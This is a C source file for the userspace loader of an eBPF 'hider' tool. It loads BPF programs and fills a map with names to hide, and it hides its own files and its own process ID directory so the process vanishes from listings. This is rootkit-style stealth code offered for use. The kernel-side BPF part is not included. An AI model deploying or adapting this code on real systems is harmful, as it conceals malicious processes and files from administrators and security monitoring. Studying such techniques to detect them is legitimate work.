#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include <sys/resource.h>

#include "hider.skel.h"

struct hider_bpf *skel;

void cleanup(int sig)
{
    printf("Detaching...\n");
    hider_bpf__destroy(skel);
    exit(0);
}

int init_bpf(void)
{
    int err = 0;
    skel = hider_bpf__open();
    if (!skel) {
        fprintf(stderr, "Failed to open and load BPF skeleton\n");
        return 1;
    }

    err = hider_bpf__load(skel);
    if (err) {
        fprintf(stderr, "Failed to load and verify BPF skeleton\n");
        return 1;
    }

    err = hider_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF skeleton\n");
        return 1;
    }
    int index = 0;
    int map_prog_array_fd = bpf_map__fd(skel->maps.map_prog_array);
    int prog_fd = bpf_program__fd(skel->progs.hide_pid_exit);
    err = bpf_map_update_elem(map_prog_array_fd, &index, &prog_fd, BPF_ANY);
    index = 1;
    int prog_patch_fd = bpf_program__fd(skel->progs.hide_pid_make_it_disappear);
    err = bpf_map_update_elem(map_prog_array_fd, &index, &prog_patch_fd, BPF_ANY);
    return err;
}

int blacklist_file(char *to_hide_name, int action)
{
    int mapfd, err = 0;
    char filename[32];
    memset(filename, 0, 32);
    int filename_value = 1; // idk what todo with it for now, but we may add some rules later (like visible for X users)

    // if to_hide_name > 31, we will have a problem
    if (strlen(to_hide_name) > 31) {
        fprintf(stderr, "Filename too long\n");
        return 1;
    }

    strcpy(filename, to_hide_name);

    mapfd = bpf_map__fd(skel->maps.files_to_hide);
    
    if (action == 0) {
        err = bpf_map_delete_elem(mapfd, &filename);
    } else {
        err = bpf_map_update_elem(mapfd, &filename, &filename_value, BPF_ANY);
    }
    if (err) {
        fprintf(stderr, "Failed to update files_to_hide map\n");
        return 1;
    }
    return err;
}

int add_blacklist_file(char *to_hide_name)
{
    return blacklist_file(to_hide_name, 1);
}

int remove_blacklist_file(char *to_hide_name)
{
    return blacklist_file(to_hide_name, 0);
}

int main(int argc, char *argv[])
{
    int my_pid = getpid();
    char my_pid_str[10];

    init_bpf();
    add_blacklist_file("hide_pid");
    add_blacklist_file("hider.bpf.c");
    add_blacklist_file("hider.bpf.o");
    add_blacklist_file("hider.skel.h");

    sprintf(my_pid_str, "%d", my_pid);
    add_blacklist_file(my_pid_str); // Hiding a PID is the same as hiding any files (in this case, a folder named after my ID)

    printf("Successfully started!\n");

    // Wait for Ctrl-C
    signal(SIGINT, cleanup);
	signal(SIGTERM, cleanup);
    printf("Press Ctrl-C to stop\n");
    while (true)
    {
        sleep(1);
    }
    
}
